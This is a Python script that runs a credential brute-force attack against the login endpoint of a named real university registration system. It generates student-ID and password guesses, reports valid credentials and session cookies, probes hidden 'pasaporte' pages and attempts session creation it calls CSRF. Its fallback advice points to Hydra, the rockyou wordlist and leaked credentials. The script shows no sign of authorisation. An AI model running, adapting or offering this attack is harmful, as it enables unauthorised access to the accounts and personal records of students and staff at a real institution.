#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BRUTE FORCE LOGIN SIIGAA - j_security_check
"""
import requests
import urllib3
import sys
urllib3.disable_warnings()

registro = "https://registro.uns.edu.pe"

print("=" * 70)
print("  BRUTE FORCE LOGIN SIIGAA")
print("  Endpoint: /udemsi/j_security_check")
print("  Metodo: POST con j_username / j_password")
print("=" * 70)

# Extended wordlist for university systems
# Common patterns for UNS (Universidad Nacional del Santa)
# Student IDs: typically 8 digits (e.g., 2018001)
# Format: year + sequential number

wordlist = []

# Generate student IDs
# Format: YYYYNNN where YYYY is year and NNN is sequential
for year in range(2015, 2026):
    for num in range(1, 100):
        wordlist.append((f"{year}{num:03d}", f"{year}{num:03d}"))

# Add common passwords
common_passwords = [
    "", "123456", "password", "1234", "12345",
    "admin", "root", "test", "guest",
    "sistema", "Sistema", "SistemaUNS",
    "uns", "UNS", "uns2024", "uns2025",
    "Estudio123", "estudio123",
    "Universidad", "universidad",
    "Alumno", "alumno", "Estudiante",
    "2024", "2025", "2026",
    "pass", "Pass", "PASS",
    "qwerty", "abc123", "letmein",
    "welcome", "Welcome",
    "Changeme", "changeme",
]

# Add specific UNS passwords
uns_passwords = [
    "UNS2024", "UNS2025", "SistemaUNS",
    "uns123", "uns1234", "uns2024",
    "Universidad", "Universidad2024",
    "UNS", "Sistema", "sistema",
    "password", "Password",
    "Alumno", "alumno",
    "Estudiante", "estudiante",
    "Docente", "docente",
    "2024", "2025", "2026",
]

# Build final wordlist
final_wordlist = []

# Student IDs with common passwords
for student_id, _ in wordlist:
    for pwd in common_passwords + uns_passwords:
        final_wordlist.append((student_id, pwd))

# Add some specific combinations
special_combos = [
    ("2018001", "123456"),
    ("2018001", "Estudio123"),
    ("2018001", "1234"),
    ("2020001", "123456"),
    ("2024001", "123456"),
    ("admin", "admin"),
    ("administrator", "administrator"),
    ("root", "root"),
    ("system", "system"),
]

final_wordlist.extend(special_combos)

print(f"  Wordlist size: {len(final_wordlist)}")
print(f"  Starting brute force...")
print()

# The login endpoint
url = f"{registro}/udemsi/j_security_check"

# Use a session to handle cookies properly
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': f"{registro}/udemsi/faces/index.xhtml",
})

# First, visit the login page to get cookies
try:
    s.get(f"{registro}/udemsi/faces/index.xhtml", timeout=5)
except:
    pass

logged_in = False
count = 0

for username, password in final_wordlist:
    count += 1
    if count % 100 == 0:
        print(f"  Probados {count} combinaciones...")
    
    try:
        r = s.post(url, data={"j_username": username, "j_password": password}, timeout=5, allow_redirects=True)
        
        # Check if login was successful
        if r.status_code == 200 and len(r.text) > 100:
            # Check for successful login indicators
            response_text = r.text.lower()
            
            if 'modulos' in response_text and 'records' not in response_text and 'logout' not in response_text:
                # This might be the modules page after login
                if 'j_username' not in response_text and 'j_password' not in response_text:
                    # No login form = successful login!
                    print(f"\n  [!] !!!!! CREDENCIALES VALIDAS ENCONTRADAS !!!!!")
                    print(f"  [!] Usuario: {username}")
                    print(f"  [!] Password: {password}")
                    print(f"  [!] Status: {r.status_code}")
                    print(f"  [!] Session cookies: {dict(s.cookies)}")
                    logged_in = True
                    break
            
            elif 'bienvenida' in response_text or 'welcome' in response_text:
                print(f"\n  [!] !!!!! CREDENCIALES VALIDAS ENCONTRADAS !!!!!")
                print(f"  [!] Usuario: {username}")
                print(f"  [!] Password: {password}")
                logged_in = True
                break
            
            elif 'logout' in response_text or 'cerrar sesion' in response_text:
                print(f"\n  [!] !!!!! CREDENCIALES VALIDAS ENCONTRADAS !!!!!")
                print(f"  [!] Usuario: {username}")
                print(f"  [!] Password: {password}")
                logged_in = True
                break
            
            elif 'modulos' in response_text and len(r.text) > 5000:
                # The modules page might be shown
                if 'j_username' not in r.text:
                    print(f"\n  [!] !!!!! ACCESO OBTENIDO !!!!!")
                    print(f"  [!] Usuario: {username}")
                    print(f"  [!] Password: {password}")
                    logged_in = True
                    break
    except:
        pass

if not logged_in:
    print(f"\n  [-] No se encontraron credenciales validas con la wordlist")
    print(f"  [-] Se probaron {count} combinaciones")
    print(f"\n  Opciones para continuar:")
    print(f"    1. Usar Hydra con wordlist de rockyou")
    print(f"    2. Usar Burp Suite con wordlist mas grande")
    print(f"    3. Buscar credenciales filtradas en la web")
    print(f"    4. Intentar con el parametro 'pasaporte'")

# ============================================
# INTENTO: Acceder al sistema con el parametro pasaporte
# ============================================
print("\n\n--- INTENTO: Parametro Pasaporte ---")
print("-" * 50)

# The "Pasaporte" button opens WebPasaporte
# Maybe there's a specific parameter or endpoint
# Try different approaches to access the passport system

passport_tests = [
    f"{registro}/WebPasaporte",
    f"{registro}/WebPasaporte/",
    f"{registro}/WebPasaporte/index.html",
    f"{registro}/WebPasaporte/passport.xhtml",
    f"{registro}/WebPasaporte/index.xhtml",
    f"{registro}/udemsi/faces/pasaporte.xhtml",
    f"{registro}/udemsi/pasaporte.xhtml",
    f"{registro}/udemsi/faces/passport.xhtml",
    f"{registro}/udemsi/faces/pasaporte",
    f"{registro}/udemsi/faces/passport",
]

for url in passport_tests:
    try:
        r = requests.get(url, timeout=5, verify=False)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"  [+] {url} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            # Check for any data
            if 'numero' in r.text.lower() or 'documento' in r.text.lower() or 'passport' in r.text.lower():
                print(f"  [!] Contiene datos!")
            # Save first successful one
            with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\passport_page.html", "w") as f:
                f.write(r.text)
            break
    except:
        pass

# ============================================
# INTENTO: CSRF contra j_security_check para crear sesión
# ============================================
print("\n\n--- CSRF: Creando sesion via j_security_check ---")
print("-" * 50)

# We proved earlier that POST to j_security_check creates a session
# Let's try with real-looking credentials to see if we can get ANY session

csrf_session = requests.Session()
csrf_session.verify = False
csrf_session.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
})

# Try to POST to j_security_check without visiting the page first
# This demonstrates CSRF
test_creds = [
    ("2024001", "123456"),
    ("2024001", "password"),
    ("test", "test"),
]

for user, pwd in test_creds:
    try:
        r = csrf_session.post(
            url,
            data={"j_username": user, "j_password": pwd},
            timeout=5,
            allow_redirects=True
        )
        cookies = dict(csrf_session.cookies)
        if 'JSESSIONID' in cookies:
            print(f"  Session creada para {user}:{pwd}")
            print(f"  JSESSIONID: {cookies['JSESSIONID']}")
            # Check if the session gives us access to modulos
            r2 = csrf_session.get(f"{registro}/udemsi/faces/modulos.xhtml", timeout=5)
            if 'No records' in r2.text:
                print(f"  Sesion activa (sin datos - requiere credenciales validas)")
            break
    except:
        pass

print("\n--- FIN ---")
